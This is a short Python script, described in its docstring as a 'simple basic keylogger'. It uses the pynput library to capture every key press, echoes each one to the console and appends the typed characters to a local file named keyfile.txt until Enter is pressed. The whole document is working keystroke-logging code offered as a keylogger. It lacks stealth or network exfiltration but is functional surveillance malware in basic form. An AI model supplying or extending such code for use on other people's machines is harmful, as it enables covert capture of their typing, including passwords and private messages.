#!/usr/bin/python3.12


''' simple basic keylogger'''
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            if key == keyboard.Key.space:  # Check if the spacebar is pressed
                logKey.write(' ')  # Write a space
            else:
                char = key.char
                logKey.write(char)
        except AttributeError:
            # Handle special keys here if needed
            print("Error getting char")

def main():
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input("Press Enter to stop...\n")  # Keeps the program running until Enter is pressed

if __name__ == "__main__":
    main()